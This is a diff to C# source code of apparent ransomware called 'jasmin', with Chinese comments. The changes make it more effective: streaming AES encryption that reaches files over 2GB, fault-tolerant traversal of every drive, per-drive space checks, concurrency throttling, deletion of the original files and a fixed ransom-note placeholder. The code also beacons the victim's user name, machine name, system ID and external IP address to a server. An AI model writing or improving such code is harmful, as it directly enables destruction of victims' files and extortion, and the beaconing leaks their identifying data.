@@ -63,16 +63,37 @@ static void ReportFails(){
 static bool Enc(string path){
   try{
     if(Skip(path))return false;
-    byte[] p=File.ReadAllBytes(path);if(p.Length==0)return false;
-    byte[] h;using(var s=SHA256.Create())h=s.ComputeHash(p);
+    long flen=0;try{flen=new FileInfo(path).Length;}catch{}
+    if(flen==0)return false;                      // 0 字节：跳过（不计失败，但计入进度分母）
     byte[] k=new byte[32],iv=new byte[16];
     using(var rng=RandomNumberGenerator.Create()){rng.GetBytes(k);rng.GetBytes(iv);}
-    byte[] ct=AesEnc(p,k,iv);
     byte[] km=new byte[48];Buffer.BlockCopy(k,0,km,0,32);Buffer.BlockCopy(iv,0,km,32,16);
     byte[] ek=RsaEnc(km);
-    using(var fs=new FileStream(path+".jasmin",FileMode.Create)){
-      fs.Write(h,0,32);fs.Write(ct,0,ct.Length);fs.Write(ek,0,ek.Length);
-      fs.Write(BitConverter.GetBytes(ek.Length),0,4);}
+    // 流式：明文只读一遍，边算 SHA256 边加密，内存恒定 1MB。
+    // 旧实现 File.ReadAllBytes 把整个文件读进内存 —— 受 .NET 数组上限约束，
+    // 超过约 2GB 的文件必然失败（OutOfMemory / IOException），且并发时内存成倍增长。
+    byte[] buf=new byte[1048576];
+    using(var fin=new FileStream(path,FileMode.Open,FileAccess.Read,FileShare.Read))
+    using(var fout=new FileStream(path+".jasmin",FileMode.Create,FileAccess.Write))
+    using(var sha=SHA256.Create()){
+      fout.Write(new byte[32],0,32);              // 先占 SHA256 的位置，最后回填
+      using(var aes=Aes.Create()){
+        aes.KeySize=256;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;aes.Key=k;aes.IV=iv;
+        var cs=new CryptoStream(fout,aes.CreateEncryptor(),CryptoStreamMode.Write);
+        int n;
+        while((n=fin.Read(buf,0,buf.Length))>0){
+          cs.Write(buf,0,n);
+          sha.TransformBlock(buf,0,n,buf,0);      // buf 已写出，可原地复用
+        }
+        sha.TransformFinalBlock(new byte[0],0,0);
+        cs.FlushFinalBlock();                     // 完成 PKCS7 padding
+        // 不再 Dispose cs：它会连带关闭 fout，而后面还要写 RSA 块并回填摘要
+      }
+      fout.Write(ek,0,ek.Length);
+      fout.Write(BitConverter.GetBytes(ek.Length),0,4);
+      fout.Seek(0,SeekOrigin.Begin);
+      fout.Write(sha.Hash,0,32);
+    }
     File.Delete(path);
     return true;
   }catch(Exception ex){
@@ -94,6 +115,10 @@ static bool Enc(string path){
 // ── 进度条 ──
 static long P_DONE=0, P_BYTES=0, P_OK=0;
 static long P_TOTAL=0, P_TOTAL_BYTES=0;
+// 每个盘各自需要的空间（加密输出写在源文件同盘，不能拿总量去要求单盘）
+static readonly System.Collections.Generic.Dictionary<string,long> P_NEED=new System.Collections.Generic.Dictionary<string,long>(StringComparer.OrdinalIgnoreCase);
+// 限制并发：每个任务持有一整个文件的缓冲区，不限并发会在多文件时打爆内存
+static readonly SemaphoreSlim P_SEM=new SemaphoreSlim(Math.Max(2,Environment.ProcessorCount));
 static long P_LAST_BEACON=0;
 static bool P_CONSOLE=false;
 static object P_LK=new object();
@@ -131,8 +156,9 @@ static void Tick(string path,long size,bool ok){
   }
   DrawBar(path);
   long now=DateTime.UtcNow.Ticks/TimeSpan.TicksPerSecond;  // 兼容 .NET 4.0+（不用 ToUnixTimeSeconds）
-  if(now-P_LAST_BEACON>=8){
-    P_LAST_BEACON=now;
+  bool fire;
+  lock(P_LK){fire=(now-P_LAST_BEACON>=8);if(fire)P_LAST_BEACON=now;}
+  if(fire){
     // 周期性回传进度（后台，不阻塞加密）
     int d=(int)done,okc=(int)P_OK,tc=(int)total;
     long by=bytes,tbs=tb;
@@ -140,12 +166,16 @@ static void Tick(string path,long size,bool ok){
   }
 }
 
+static string _IP=null;
+static readonly HttpClient _HC=new HttpClient();
 static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
   try{
     string u=Environment.UserName,m=Environment.MachineName;
     string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
-    string ip="0.0.0.0";try{ip=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{}
-    var c=new HttpClient();
+    // 外网查询只做一次并缓存：进度心跳每 8 秒一次，每次查会拖慢加密、反复外联、并耗尽 socket
+    if(_IP==null){try{_IP=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{_IP="0.0.0.0";}}
+    string ip=_IP;
+    var c=_HC;
     var kv=new List<KeyValuePair<string,string>>{
       new("machine_name",m),new("computer_user",u),new("systemid",SID),
       new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
@@ -170,7 +200,7 @@ static string NOTE=@"
 static System.Collections.Generic.HashSet<string> NOTE_DIRS=new System.Collections.Generic.HashSet<string>();
 
 static void DropNotes(){
-  string txt=NOTE.Replace("{SID}",SID);
+  string txt=NOTE.Replace("{sid}",SID);   // 占位符是小写 {sid}，写 {SID} 永远替换不到
   int wrote=0;
   string[] dirs={
     Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
@@ -186,16 +216,30 @@ static void DropNotes(){
   if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Ransom note dropped in "+wrote+" location(s)");}catch{}}
 }
 
+// 容错递归遍历：Directory.EnumerateFiles(..., AllDirectories) 只要碰到一个
+// 无权限的目录就整体抛异常，被外层 catch 吞掉后整轮扫描中断 —— 会漏掉大量文件。
+// 改为逐目录 try/catch，遇错只跳过该目录。
+static void Walk(string dir,System.Action<string> onFile){
+  try{foreach(string f in Directory.EnumerateFiles(dir)){try{onFile(f);}catch{}}}catch{}
+  try{foreach(string d in Directory.EnumerateDirectories(dir)){Walk(d,onFile);}}catch{}
+}
+
 // ── 预扫描：只统计数量与总字节，不保存路径列表 ──
 static void ScanTargets(){
   try{P_CONSOLE=AttachConsole(-1);}catch{P_CONSOLE=false;}
   foreach(var dr in DriveInfo.GetDrives()){
-    try{foreach(string ext in EXTS){
-      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
-        if(Skip(f))continue;
+    try{
+      Walk(dr.Name,f=>{
+        if(Skip(f))return;
+        bool match=false;
+        foreach(string ext in EXTS){if(f.EndsWith(ext.Substring(1),StringComparison.OrdinalIgnoreCase)){match=true;break;}}
+        if(!match)return;
         long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
         P_TOTAL++;P_TOTAL_BYTES+=fsz;
-      }}catch{}}}catch{}}
+        long cur;P_NEED.TryGetValue(dr.Name,out cur);P_NEED[dr.Name]=cur+fsz;
+      });
+    }catch{}
+  }
 }
 
 static void Preflight(){
@@ -203,7 +247,7 @@ static void Preflight(){
     foreach(var dr in DriveInfo.GetDrives()){
       try{
         if(!dr.IsReady)continue;
-        long need=P_TOTAL_BYTES;
+        long need;P_NEED.TryGetValue(dr.Name,out need);
         if(need>0&&dr.AvailableFreeSpace<need+need/20){
           if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! Preflight warning: "+dr.Name+" has "+FmtB(dr.AvailableFreeSpace)+" free < ~"+FmtB(need)+" required (each file needs an equally sized .jasmin copy; insufficient space causes widespread failures)");
         }
@@ -227,26 +271,36 @@ static void Main(){
   object lk=new object();
 
   foreach(var dr in DriveInfo.GetDrives()){
-    try{foreach(string ext in EXTS){
-      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
-        if(Skip(f))continue;
+    try{
+      Walk(dr.Name,f=>{
+        if(Skip(f))return;
+        bool match=false;
+        foreach(string ext in EXTS){if(f.EndsWith(ext.Substring(1),StringComparison.OrdinalIgnoreCase)){match=true;break;}}
+        if(!match)return;
         long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
         string fc=f;long fszc=fsz;
+        P_SEM.Wait();                       // 限流：每个任务持有整个文件的缓冲
         tasks.Add(System.Threading.Tasks.Task.Run(()=>{
-          bool ok=Enc(fc);
-          Tick(fc,fszc,ok);
-          if(ok){lock(lk){encCount++;encSize+=fszc;
-            try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
-            string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
-            if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
-            typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
+          try{
+            bool ok=Enc(fc);
+            Tick(fc,fszc,ok);
+            if(ok){lock(lk){encCount++;encSize+=fszc;
+              try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
+              string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
+              if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
+              typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
+          }finally{P_SEM.Release();}
         }));
-      }}catch{}}}catch{}}
+        if(tasks.Count>=2048){System.Threading.Tasks.Task.WaitAll(tasks.ToArray());tasks.Clear();}
+      });
+    }catch{}
+  }
   System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
   if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] Encryption complete: "+encCount+"/"+P_TOTAL+" file(s), "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
   ReportFails();
 
-  DropNotes();
+  if(P_TOTAL>0)DropNotes();
+  else if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Nothing was encrypted - skipped ransom note drop.");}catch{}}
   // 构建detail JSON
   var sb=new System.Text.StringBuilder("{");
   bool first=true;
